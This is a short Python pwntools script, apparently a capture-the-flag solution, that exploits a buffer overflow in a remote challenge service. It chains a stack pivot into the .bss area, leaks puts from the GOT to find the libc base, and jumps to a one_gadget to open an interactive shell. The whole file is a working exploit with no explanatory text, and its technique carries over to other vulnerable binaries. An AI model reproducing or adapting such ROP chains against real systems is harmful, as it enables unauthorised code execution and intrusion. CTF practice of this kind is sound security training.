#! /usr/bin/env python

from pwn import *

io = remote('csie.ctf.tw', 10131)


raw_input('@')

# .text
read_plt = 0x400610
puts_plt = 0x4005e0
puts_got = 0x600fc8

# libc
puts_offset = 0x809c0
system_offset = 0x4f440

# unitlity
empty = '\x00'*8

# section
# start at 0x601060, end at 0x6012e0, size: 0x280
section_start = 0x601060
ROP_section = 0x601060      # self-defined
string_section = 0x6012d0   # self-defined
section_end = 0x6012e0

# gadgets
pop_rdi = 0x400883
pop_rsi_r15 = 0x400881
leave_ret = 0x400818
pop_rbp = 0x4006f9
call_rsp = 0x40086a

# new section
new_section_start = section_start
new_ROP_section = 0x601e00
new_string_section = 0x601f00
new_section_end = 0x602000

# First input..
ROP_read = empty
ROP_read += p64(pop_rdi)
ROP_read += p64(0x0)
ROP_read += p64(pop_rsi_r15)
ROP_read += p64(new_ROP_section)
ROP_read += empty
ROP_read += p64(read_plt)
ROP_read += p64(pop_rbp)
ROP_read += p64(new_ROP_section)
ROP_read += p64(leave_ret) 


io.sendafter('something:', ROP_read)

# Second input..
extra_data = ''
payload = '\x00'*8 + extra_data.ljust(0x18 ,'\x00')
bof = payload + p64(ROP_section) + p64(leave_ret)
io.sendafter('say?', bof)

sleep(1)

# Third input.. (open by myself)
ROP_leak = empty 
ROP_leak += p64(pop_rdi)
ROP_leak += p64(puts_got)
ROP_leak += p64(puts_plt)
ROP_leak += p64(pop_rdi)
ROP_leak += p64(0x0)
ROP_leak += p64(pop_rsi_r15)
ROP_leak += p64(new_ROP_section)
ROP_leak += empty
ROP_leak += p64(read_plt)
ROP_leak += p64(pop_rbp)
ROP_leak += p64(new_ROP_section)
ROP_leak += p64(leave_ret) 

io.send(ROP_leak)

io.recvline()
io.recvline()
leak_libc = io.recvline()
leak_libc = u64(leak_libc.strip().ljust(8,'\x00'))
print hex(leak_libc)

libc_base = leak_libc - puts_offset
print hex(libc_base)
one_gadget = libc_base + 0x10a38c

# 4nd input.. (open by myself)
ROP_getshell = empty
ROP_getshell += p64(call_rsp)
ROP_getshell += p64(one_gadget)

io.send(ROP_getshell)

io.interactive()
